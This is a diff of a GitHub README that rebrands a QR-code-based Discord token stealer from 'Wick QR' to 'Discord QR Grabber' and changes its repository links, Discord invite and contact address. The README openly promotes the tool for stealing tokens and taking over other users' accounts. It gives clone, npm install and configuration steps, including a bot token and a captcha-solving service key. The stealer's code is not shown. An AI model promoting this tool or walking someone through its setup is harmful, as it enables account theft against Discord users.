@@ -1,16 +1,16 @@
 [github-assets-img-config-link]: /assets/config.png
 [github-assets-img-qr-link]: /assets/qr.png
 [github-assets-img-verify-link]: /assets/verify.png
-[github-link]: https://github.com/fweak1337/wick
-[discord-server-link]: https://discord.gg/XS1btuuUR7
+[github-link]: https://github.com/fweak1337/Discord-QR-Token-Grabber
+[discord-server-link]: https://discord.gg/XS11btuuUR7
 
 <div align="center">
 
 <img src="assets/avatar.png" width=100 alt="Aurita"/><br/>
 
-# [@Wick Qr Grabbing][github-link]
+# [@Discord Qr Grabbing][github-link]
 
-Wick QR is a Discord token stealer that utilizes QR codes to capture and verify tokens.
+Discord QR Grabber is a Discord token stealer that utilizes QR codes to capture and verify tokens.
 
 </div>
 
@@ -52,7 +52,7 @@ Wick QR is a Discord token stealer that utilizes QR codes to capture and verify 
 
 ## Overview
 
-Wick QR is a sophisticated Discord token stealer that employs QR codes to efficiently capture and verify users. By using this method, you discreetly facilitate the theft of tokens, allowing unauthorized access to user accounts on Discord.
+Discord QR Grabber is a sophisticated Discord token stealer that employs QR codes to efficiently capture and verify users. By using this method, you discreetly facilitate the theft of tokens, allowing unauthorized access to user accounts on Discord.
 
 ## Getting Started
 
@@ -67,18 +67,18 @@ Wick QR is a sophisticated Discord token stealer that employs QR codes to effici
 1. Install [Git](https://git-scm.com/) and then use these commands in the console.
 
 ```bash
-git clone https://github.com/k4itrun/wick.git
+git clone https://github.com/fweak1337/Discord-QR-Token-Grabber.git
 ```
 
 ```bash
-cd wick
+cd to directory
 ```
 
 ```bash
 npm install
 ```
 
-2. Modify the `example.config.json` file to `config.json`, then add your bot token, ids, and [capmonster](https://capmonster.cloud) API key ![][github-assets-img-config-link]
+2. Modify the `config.json`, then add your bot token, ids, and [capmonster](https://capmonster.cloud) API key ![][github-assets-img-config-link]
 
 ## Usage
 
@@ -99,11 +99,11 @@ npm run start
 
 ### Star History
 
-<a href="https://star-history.com/#k4itrun/wick&Timeline">
+<a href="https://star-history.com/#fweak1337/Discord-QR-Token-Grabber&Timeline">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=k4itrun/wick&type=Timeline&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=k4itrun/wick&type=Timeline" />
-    <img alt="Star History wick" src="https://api.star-history.com/svg?repos=k4itrun/wick&type=Timeline" />
+    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=fweak/Discord-QR-Token-Grabber&type=Timeline&theme=dark" />
+    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=fweak/Discord-QR-Token-Grabber&type=Timeline" />
+    <img alt="Star History Discord-QR-Token-Grabber" src="https://api.star-history.com/svg?repos=fweak/Discord-QR-Token-Grabber&type=Timeline" />
   </picture>
 </a>
 
@@ -113,13 +113,12 @@ We greatly appreciate any contributions to this project! Whether you want to ope
 
 You can support the development of this project by making a donation, which helps bring new, optimized, and improved projects to life. Alternatively, you can simply add a ⭐ star to this repository.
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/A0A11481X5)
 
 Thank you for your interest and support! ✌️
 
 ## Contact
 
-For inquiries, reach out at [contact@w1sh.xyz](mailto:contact@w1sh.xyz) or join our [Discord Server][discord-server-link].
+For inquiries, reach out at [contact@ping.fo](mailto:contact@ping.fo) or join our [Discord Server][discord-server-link].
 
 ## License
 
